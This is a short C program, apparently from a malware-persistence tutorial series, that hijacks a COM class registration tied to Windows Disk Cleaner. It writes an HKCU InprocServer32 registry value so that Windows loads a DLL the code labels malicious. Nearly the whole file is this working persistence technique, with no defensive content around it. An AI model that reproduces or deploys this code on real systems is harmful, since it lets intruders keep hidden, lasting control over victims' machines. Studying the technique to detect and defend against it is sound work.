/*
 * Malware Persistence 101
 * pers.c
 * windows persistence via Disk Cleaner
 * author: @cocomelonc
*/
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // subkey
  const char* sk = "Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}\\InprocServer32";

  // malicious DLL
  const char* dll = "Z:\\hack.dll";

  // startup
  LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  } else {
    printf("cannot create subkey value :(\n");
    return -1;
  }
  return 0;
}